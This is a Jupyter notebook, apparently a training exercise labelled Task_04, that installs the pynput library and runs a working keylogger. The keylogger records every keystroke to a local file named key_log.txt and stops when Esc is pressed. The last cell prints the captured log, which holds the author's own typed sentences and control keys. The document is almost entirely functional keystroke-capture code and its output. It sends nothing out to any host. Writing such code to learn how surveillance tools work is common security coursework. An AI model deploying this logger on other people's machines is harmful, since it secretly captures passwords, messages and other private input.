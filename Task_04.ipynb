{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "f719f4ed-ea22-4196-aac1-ede9eb152a09",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Defaulting to user installation because normal site-packages is not writeable\n",
      "Requirement already satisfied: pynput in c:\\users\\acer\\appdata\\roaming\\python\\python311\\site-packages (1.7.7)\n",
      "Requirement already satisfied: six in c:\\users\\acer\\appdata\\roaming\\python\\python311\\site-packages (from pynput) (1.16.0)\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "6e1b977d-842d-42fc-a045-d8e926b264a8",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f1d2b042-d2ab-49ed-8598-886ef68e0a8c",
   "metadata": {},
   "outputs": [],
   "source": [
    "# File where keystrokes will be saved\n",
    "log_file = \"key_log.txt\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "208fa603-c7d9-4b02-a4c6-a2d301317ebd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    if key in {keyboard.Key.ctrl_r, keyboard.Key.shift_r}:\n",
    "        return  # Skip logging this key\n",
    "    try:\n",
    "        with open(log_file, \"a\") as file:\n",
    "            file.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        with open(log_file, \"a\") as file:\n",
    "            file.write(f\"[{key}]\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "8a072475-5dec-49ba-a2a8-15fe8772fa6a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Function to stop logging on a specific key (e.g., ESC)\n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        return False  # Stop listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f68cc786-d528-4d64-95bd-e4809a7bb9fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Main listener loop\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "5d15d121-388b-4c68-8f5d-be0766077dd1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0013[Key.ctrl_r]\u0003[Key.ctrl_r][Key.shift_r][Key.enter][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.shift_r][Key.enter][Key.shift_r][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.space][Key.space]this[Key.space]g[Key.backspace]code[Key.space]takes[Key.space]long[Key.space]time[Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.ctrl_r]\u0003[Key.ctrl_r]\u0016wat[Key.space]will[Key.space]be[Key.space]the[Key.space]the[Key.space]output[Key.space]in[Key.space]notebook[Key.enter][Key.ctrl_r]\u0016[Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.enter]this[Key.space][Key.ctrl_r]\u0016[Key.ctrl_r]\u0013[Key.shift_r][Key.enter][Key.ctrl_r]\u0016[Key.ctrl_r]\u001a[Key.ctrl_r]\u0003[Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.backspace][Key.ctrl_r]\u0016[Key.space][Key.space][Key.space][Key.ctrl_r]\u0003error[Key.space]im[Key.space]getting[Key.space]is[Key.space][Key.ctrl_r]\u0016[Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter][Key.ctrl_r]\u0003[Key.ctrl_r]\u0016[Key.shift_r][Key.enter]\n"
     ]
    }
   ],
   "source": [
    "# Display the contents of the log file\n",
    "with open(\"key_log.txt\", \"r\") as file:\n",
    "    print(file.read())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26eff930-53a7-4749-ae0e-4b081c8caa22",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
